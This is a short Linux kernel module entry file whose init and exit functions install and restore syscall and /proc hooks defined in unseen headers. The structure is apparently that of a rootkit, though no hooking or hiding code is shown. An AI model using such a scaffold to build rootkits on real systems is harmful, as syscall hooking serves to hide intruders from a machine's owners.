#ifndef __KERNEL__
 #define __KERNEL__
#endif
#ifndef MODULE
 #define MODULE
#endif

#include "includes.h"
#include "syscall_hook.h"
#include "proc_hook.h"

#include <linux/init.h>

MODULE_LICENSE("GPL");

EXPORT_NO_SYMBOLS;

int unlink_init(void)
{
	init_syscalls();
	init_proc();
	return 0;
}

void unlink_cleanup(void)
{
	restore_syscalls();
	restore_proc();
}

module_init(unlink_init);
module_exit(unlink_cleanup);
